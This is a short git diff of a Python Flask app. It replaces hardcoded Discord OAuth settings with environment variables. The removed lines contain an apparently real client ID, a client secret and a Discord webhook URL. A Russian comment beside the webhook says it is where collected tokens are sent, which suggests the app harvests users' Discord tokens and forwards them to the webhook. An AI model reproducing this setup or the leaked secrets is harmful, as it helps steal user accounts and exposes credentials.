@@ -11,12 +11,11 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# ===== НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ) =====
-CLIENT_ID = "1527673986652176454"  # Ваш Client ID из Discord Developer Portal
-CLIENT_SECRET = "BDSxVH-0mJDliOaFKcrIlL0vswgU7Sdt"  # Ваш Client Secret
-REDIRECT_URI = "https://ВАШ_СЕРВИС.onrender.com/callback"  # Замените после деплоя
-WEBHOOK_URL = "https://https://discord.com/api/webhooks/1527674667274473502/VOQWxCWhCW0nx1-LY2PGhhJbNLBJadXkUOu1X3e2Y7nY43_gkhJaEGCvRtHcCqXatC79/collect"  # Куда отправлять токены
-# =========================================
+import os
+CLIENT_ID = os.environ.get('CLIENT_ID')
+CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
+WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
+REDIRECT_URI = os.environ.get('REDIRECT_URI')
 
 # Простой HTML для главной страницы
 HOME_PAGE = """
